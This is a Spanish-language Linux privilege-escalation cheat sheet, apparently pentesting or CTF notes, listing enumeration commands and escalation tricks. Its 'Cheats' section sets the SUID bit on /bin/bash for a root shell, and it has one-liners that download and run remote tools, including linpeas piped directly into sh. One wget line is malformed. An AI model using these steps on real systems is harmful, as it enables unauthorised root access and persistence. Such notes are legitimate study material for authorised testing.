# Sanitización de Shell

```
script /dev/null -c bash
## CTRL+Z
reset xterm
export TERM=xterm
export SHELL=bash
source /etc/skel/.bashrc
``` 

### [[penelope]]

# Reconocimiento
## Información del sistema y kernel
```bash
uname -a
```
Muestra toda la información disponible acerca del sistema y el kernel, nombre y versión del kernel, nombre del host, fecha de compilación, arquitectura del hardware y SO.

``` bash
cat /etc/issue
```
Muestra el identificador de la distribución del sistema operativo

```bash
cat /proc/version
```
Muestra información detallada de la versión del kernel de Linux, incluyendo el compilador usado y la fecha de compilación.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
Comprueba si la versión de `sudo` es vulnerable.

## Información de la red

```shell
ipconfig
```
Muestra la configuración de red (IP, máscara...)

```shell
ip a
```
Muestra información detallada de todas las interfaces de red

```shell
netstat -tulpn
```
Muestra sockets de escucha (`-l`) TCP/UDP (`-t`/`-u`), con números en lugar de nombres (`-n`) y el proceso/programa que los usa (`-p`). Requiere permisos de root para ver todos los procesos.

```shell
arp -a
```
Muestra la tabla ARP (Protocolo de resolución de direcciones) del sistema, que mapea direcciones IP a direcciones MAC en la red local.

```bash
ss -nltp
```
Info sobre los puertos abiertos

## Usuarios y grupos

```shell
cat /etc/passwd
```
Muestra el archivo de base de datos de usuarios del sistema. Lista todas las cuentas de usuario, su UID, GID, directorio home y shell por defecto. Las contraseñas se almacenan en `/etc/shadow`.

```shell
cat /etc/group
```
Muestra el archivo de base de datos de grupos del sistema. Lista todos los grupos, su GID y los usuarios que son miembros de cada uno.

```shell
whoami
```
Muestra el nombre del usuario actual que ejecuta la sesión/comando

```shell
id
```
Muestra los identificadores del usuario actual (UID), grupo primario (GID) y grupos secundarios a los que pertenece.

```shell
sudo -l
```
Lista los comandos que el usuario actual tiene permitido ejecutar con privilegios de superusuario (sudo) según el archivo `/etc/sudoers`.

## Procesos en ejecución

```shell
ps aux
```
Muestra una instantánea de todos los procesos (`ps`) del sistema (`a`) de todos los usuarios (`u`) con un formato extendido (`x`). Incluye usuario, PID, uso de CPU/Memoria y el comando ejecutado.

```shell
ps -ef
```
Muestra una lista completa de todos los procesos en formato estilo BSD (`-e` para todos, `-f` para formato completo). Incluye UID, PID, PPID, hora de inicio, TTY, tiempo de CPU y el comando.

```shell
top
```
Muestra una vista dinámica en tiempo real de los procesos del sistema, ordenados por uso de recursos (CPU, memoria). Permite interacción (matar, reniciar prioridades).

## Servicios y cron jobs

```shell
systemctl list-timers
```
Lista todos los temporizadores del systemd (tareas programadas), mostrando cuándo se activarán a continuación y la unidad de servicio asociada.

```shell
crontab -l
```
Lista las tareas programadas (cron jobs) del usuario actual.

```shell
ls -la /etc/cron*
```
Lista todos los archivos y directorios en `/etc/cron.d/`, `/etc/cron.daily/`, etc., que contienen tareas programadas del sistema.

```shell
cat /etc/crontab
```
Muestra el archivo de configuración principal de cron para el sistema (tareas globales).

## Archivos con permisos SUID/SGID

```shell
find / -perm -u=s -type f 2>/dev/null
```
Busca archivos con el bit SUID (Set User ID) activado, que se ejecutan con los permisos de su propietario.

```shell
find / -perm -g=s -type f 2>/dev/null
```
Busca archivos con el bit SGID (Set Group ID) activado, que se ejecutan con los permisos de su grupo.

## Enumerar capabilities

```bash
getcap -r / 2>/dev/null
```


```zsh
cat /dir/dir/file | grep Cap
```
Para ver Caps de un archivo concreto

## Archivos editables por el usuario actual
```shell
find / -writable -type d 2>/dev/null
```
Busca directorios en los que el usuario actual tiene permisos de escritura.

```shell
find / -type f -writable 2>/dev/null 2>/dev/null
```
Busca archivos en los que el usuario actual tiene permisos de escritura.

# env
```
env
```
Para ver las variables de entorno


# Docker
## Docker socket
Si es posible comunicarse con `/var/run/docker.sock`, por ejemplo mediante `curl`, es posible spawnear un contenedor privilegiado y ganar acceso root al host



# Cheats

```bash
chmod u+s /bin/bash
```
Este código añade el bit SUID al binario bash, después solo es necesario esperar a que se ejecute y lanzar un `bash -p` 

```bash
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py | chmod +x suid3num.py
```
Suid3num

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64 && ./pspy64
```
pspy64 oneliner

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
Linpeas oneliner

```bash
mysql -u USERNAME -pPASSWORD -h HOSTNAMEORIP DATABASENAME 
```
MySQL oneliner DB connection